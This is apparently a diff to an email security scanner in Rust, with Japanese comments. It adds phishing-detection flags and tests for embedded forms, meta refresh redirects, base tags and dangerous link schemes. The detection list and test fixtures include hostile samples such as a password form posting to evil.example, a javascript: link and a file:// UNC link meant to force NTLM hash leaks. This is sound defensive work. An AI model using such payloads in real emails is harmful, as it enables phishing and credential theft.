@@ -13321,6 +13321,22 @@ pub struct ExtractedBodyText {
     /// コールバックフィッシング (BazaCall 型) で「クリック不要・
     /// 電話をかけさせる」誘導経路の兆候 (D237)。
     pub tel_link: bool,
+    /// `<form>`/`<input>`/`<button>`/`<select>`/`<textarea>` 要素が
+    /// あるか — メール内に完結する入力フォームの兆候 (D961)。
+    /// 資格情報収集フォームを本文に埋め込むフィッシングは、外部
+    /// サイトに誘導しないため URL 評判判定を素通りする。
+    pub form_present: bool,
+    /// `<meta http-equiv="refresh">` による自動転送があるか —
+    /// 開封と同時に外部サイトへ遷移させる誘導経路の兆候 (D962)。
+    pub meta_refresh: bool,
+    /// `<base>` タグがあるか — 相対 URL の解決基準を送信側が
+    /// 書き換える基準 URI 偽装の兆候 (D963)。
+    pub base_tag: bool,
+    /// `href` のリンク先スキームが `data:`/`javascript:`/`vbscript:`/
+    /// `file:`/`blob:` のいずれかであるか — data: URI ペイロード内包、
+    /// スクリプト実行、`file://` UNC 参照による SMB 強制認証
+    /// (NTLM ハッシュ送信) の誘導経路の兆候 (D964)。
+    pub dangerous_scheme_link: bool,
 }
 
 /// 表示テキストと実リンク先が一致しないリンク (D162)。
@@ -13507,6 +13523,10 @@ pub fn html_to_text(html: &str) -> ExtractedBodyText {
         hidden_content: hidden_chars >= 32,
         link_mismatches,
         tel_link: has_tel_link(html),
+        form_present: has_form_elements(html),
+        meta_refresh: has_meta_refresh(html),
+        base_tag: has_base_tag(html),
+        dangerous_scheme_link: has_dangerous_scheme_link(html),
     }
 }
 
@@ -13518,6 +13538,111 @@ pub fn html_to_text(html: &str) -> ExtractedBodyText {
 fn has_tel_link(html: &str) -> bool {
     let lower = html.to_ascii_lowercase();
     lower.contains("href=\"tel:") || lower.contains("href='tel:")
+}
+
+/// `<name` の直後がタグ区切り (空白・`>`・`/`・EOF) の開始タグを探す。
+///
+/// `<basefont>` や `<format>` のような前方一致の誤検を避けるため、
+/// タグ名の後に要素名が続かないことを確認する。
+fn has_open_tag(lower: &str, name: &str) -> bool {
+    let needle = format!("<{name}");
+    let mut rest = lower;
+    while let Some(i) = rest.find(&needle) {
+        let after = &rest[i + needle.len()..];
+        if after
+            .chars()
+            .next()
+            .is_none_or(|c| c.is_whitespace() || c == '>' || c == '/')
+        {
+            return true;
+        }
+        rest = after;
+    }
+    false
+}
+
+/// メール本文に HTML フォーム要素があるかを検出する (D961)。
+///
+/// `<form>`/`<input>`/`<button>`/`<select>`/`<textarea>` は「入力を
+/// 求める」要素。正規の配信メールはフォームを埋め込まずリンクで
+/// Web フォームに遷移させるため、本文内のフォーム要素はメール内に
+/// 完結する資格情報収集フォームの兆候となる — 外部サイトへ誘導
+/// しない分、URL の評判判定を素通りするフィッシングの定形
+/// (資格情報を求めるフォームの存在は PhishKey (arXiv 2506.21106)
+/// 等でもフィッシングのコア特徴として使われる)。
+fn has_form_elements(html: &str) -> bool {
+    const FORM_TAGS: &[&str] = &["form", "input", "button", "select", "textarea"];
+    let lower = html.to_ascii_lowercase();
+    FORM_TAGS.iter().any(|t| has_open_tag(&lower, t))
+}
+
+/// `<meta http-equiv="refresh">` による自動転送を検出する (D962)。
+///
+/// 開封と同時に外部サイトへ遷移させるタグ。HTML メール・添付 HTML の
+/// 本文に 0 秒リダイレクトを仕込んでフィッシングページへ飛ばす定形。
+fn has_meta_refresh(html: &str) -> bool {
+    let lower = html.to_ascii_lowercase();
+    let mut rest = lower.as_str();
+    while let Some(i) = rest.find("<meta") {
+        let after = &rest[i + 5..];
+        if !after
+            .chars()
+            .next()
+            .is_none_or(|c| c.is_whitespace() || c == '>' || c == '/')
+        {
+            rest = after;
+            continue;
+        }
+        let end = after.find('>').unwrap_or(after.len());
+        let inner = &after[..end];
+        if inner.contains("http-equiv") && inner.contains("refresh") {
+            return true;
+        }
+        rest = &after[end..];
+    }
+    false
+}
+
+/// `<base>` タグの存在を検出する (D963)。
+///
+/// `<base href>` は相対 URL の解決基準 URI を書き換える — `<a href="
+/// /login">` のような相対リンクを、タグを解釈する描画環境では
+/// 送信者の指定した別ドメインへ向かわせる基準 URI 偽装の手段。
+fn has_base_tag(html: &str) -> bool {
+    has_open_tag(&html.to_ascii_lowercase(), "base")
+}
+
+/// `href` のリンク先に実行・外部取得スキームが使われているかを検出する (D964)。
+///
+/// `data:` — `data:text/html` のペイロード内包。遷移先の URL 欄に
+///   ドメインが表示されないため見た目の真偽判断ができない
+///   (data: URI フィッシングは Unit 42 等が報告)。
+/// `javascript:`/`vbscript:`/`blob:` — スクリプト・生成物の実行。
+/// `file:` — `file://\\host\share` の UNC 参照。SMB 認証要求を
+///   強制して NTLM ハッシュを外部へ送らせる強制認証の定形。
+/// いずれも正規メールのリンク先には使われない。
+fn has_dangerous_scheme_link(html: &str) -> bool {
+    const SCHEMES: &[&str] = &["data:", "javascript:", "vbscript:", "file:", "blob:"];
+    let lower = html.to_ascii_lowercase();
+    let mut rest = lower.as_str();
+    while let Some(i) = rest.find("href") {
+        let after = &rest[i + 4..];
+        let t = after.trim_start();
+        if !t.starts_with('=') {
+            rest = after;
+            continue;
+        }
+        let v = t[1..].trim_start();
+        let v = v
+            .strip_prefix('"')
+            .or_else(|| v.strip_prefix('\''))
+            .unwrap_or(v);
+        if SCHEMES.iter().any(|s| v.starts_with(s)) {
+            return true;
+        }
+        rest = after;
+    }
+    false
 }
 
 /// 本文中の難読化 URL トークンの種別。
@@ -15248,6 +15373,80 @@ mod tests {
         assert!(html_to_text(html4).tel_link);
         let html5 = "<a href='tel:+123'>x</a>";
         assert!(html_to_text(html5).tel_link);
+    }
+
+    // ── D961: メール内フォーム要素 ─────────────────────────────────
+    #[test]
+    fn html_to_text_はフォーム要素を検出する() {
+        assert!(html_to_text(r#"<form action="https://evil.example/c"><input name="pw"></form>"#).form_present);
+        assert!(html_to_text("<p>login</p><input type=text>").form_present);
+        assert!(html_to_text("<button type=submit>ok</button>").form_present);
+        assert!(html_to_text("<select><option>a</option></select>").form_present);
+        assert!(html_to_text("<textarea rows=3></textarea>").form_present);
+        // 大文字・自己完結形・改行区切り
+        assert!(html_to_text("<FORM action=x><INPUT></FORM>").form_present);
+        assert!(html_to_text("<input\n  type=password>").form_present);
+        // <formula> / <informal> のような前方一致は誤検しない
+        assert!(!html_to_text("<formula>x+1</formula>").form_present);
+        assert!(!html_to_text("<p>please fill the form online</p>").form_present);
+        assert!(!html_to_text("<p>clean</p>").form_present);
+    }
+
+    // ── D962: meta refresh ────────────────────────────────────────
+    #[test]
+    fn html_to_text_はmeta_refreshを検出する() {
+        assert!(html_to_text(
+            r#"<meta http-equiv="refresh" content="0;url=https://evil.example">"#,
+        )
+        .meta_refresh);
+        assert!(html_to_text(
+            r#"<META HTTP-EQUIV="Refresh" CONTENT="0; URL=https://evil.example">"#,
+        )
+        .meta_refresh);
+        // refresh のない meta は対象外
+        assert!(!html_to_text(r#"<meta charset="utf-8">"#).meta_refresh);
+        assert!(!html_to_text(
+            r#"<meta http-equiv="Content-Security-Policy" content="x">"#,
+        )
+        .meta_refresh);
+        // <metadata> のような前方一致は誤検しない
+        assert!(!html_to_text("<metadata>http-equiv=refresh</metadata>").meta_refresh);
+        assert!(!html_to_text("<p>clean</p>").meta_refresh);
+    }
+
+    // ── D963: base タグ ───────────────────────────────────────────
+    #[test]
+    fn html_to_text_はbase_tagを検出する() {
+        assert!(html_to_text(
+            r#"<head><base href="https://evil.example/"></head><a href="/login">x</a>"#,
+        )
+        .base_tag);
+        assert!(html_to_text("<BASE href=https://x/>").base_tag);
+        // <basefont> / <base64> のような前方一致は誤検しない
+        assert!(!html_to_text("<basefont size=3>x</basefont>").base_tag);
+        assert!(!html_to_text("<p>clean</p>").base_tag);
+    }
+
+    // ── D964: 危険スキームのリンク ────────────────────────────────
+    #[test]
+    fn html_to_text_は危険スキームリンクを検出する() {
+        assert!(html_to_text(
+            r#"<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>"#,
+        )
+        .dangerous_scheme_link);
+        assert!(html_to_text(r#"<a href="javascript:alert(1)">x</a>"#).dangerous_scheme_link);
+        assert!(html_to_text(r#"<a href="vbscript:msgbox(1)">x</a>"#).dangerous_scheme_link);
+        assert!(html_to_text(r#"<a href="file://\\evil.example\s\i">x</a>"#).dangerous_scheme_link);
+        assert!(html_to_text(r#"<a href="blob:https://x/1">x</a>"#).dangerous_scheme_link);
+        // 無引用符・大文字・= の両側空白
+        assert!(html_to_text(r#"<a href=DATA:text/html,x>x</a>"#).dangerous_scheme_link);
+        assert!(html_to_text("<a href ='JAVASCRIPT:x'>x</a>").dangerous_scheme_link);
+        // 正規のスキーム・tel:/mailto:/cid: は対象外
+        assert!(!html_to_text(r#"<a href="https://example.com">x</a>"#).dangerous_scheme_link);
+        assert!(!html_to_text(r#"<a href="tel:+123">x</a>"#).dangerous_scheme_link);
+        assert!(!html_to_text(r#"<a href="mailto:a@b">x</a>"#).dangerous_scheme_link);
+        // テキスト中の素の "data:" は href 属性でないため対象外
+        assert!(!html_to_text("<p>data:text/html</p>").dangerous_scheme_link);
     }
 
     #[test]
